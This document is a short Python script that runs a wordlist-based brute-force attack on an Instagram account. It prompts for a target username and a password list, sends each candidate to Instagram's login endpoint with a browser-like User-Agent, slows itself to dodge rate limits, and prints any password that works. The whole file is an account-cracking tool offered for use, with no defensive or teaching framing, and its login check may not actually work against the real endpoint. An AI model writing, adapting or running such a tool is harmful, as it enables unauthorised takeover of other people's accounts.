import requests
import time

# Function to check the Instagram password
def check_password(username, password):
    url = f"https://www.instagram.com/accounts/login/ajax/"
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
    }

    # Simulate login form
    data = {
        'username': username,
        'password': password,
    }

    try:
        # Sending login request
        response = session.post(url, headers=headers, data=data)
        if response.status_code == 200 and 'authenticated' in response.text:
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error occurred: {e}")
        return None

# Function to display the found password with a border
def display_found_password(password):
    border = "=" * (len(password) + 6)
    print(f"\n{border}\n= Found Password: {password} =\n{border}")

# Function to process the wordlist and attempt password cracking
def crack_password(username, wordlist):
    try:
        with open(wordlist, 'r') as file:
            passwords = file.readlines()
            attempt_count = 0

            for password in passwords:
                password = password.strip()
                attempt_count += 1

                # Check every 100 passwords per second
                if attempt_count % 100 == 0:
                    time.sleep(1)

                print(f"Attempting: {password}")
                result = check_password(username, password)

                if result is None:
                    print("Error: Could not complete the request.")
                elif result:
                    display_found_password(password)
                    break
    except FileNotFoundError:
        print("Error: Wordlist file not found.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

# Main execution
if __name__ == "__main__":
    username = input("Enter Instagram username: ")
    wordlist = input("Enter the path of your wordlist: ")

    crack_password(username, wordlist)
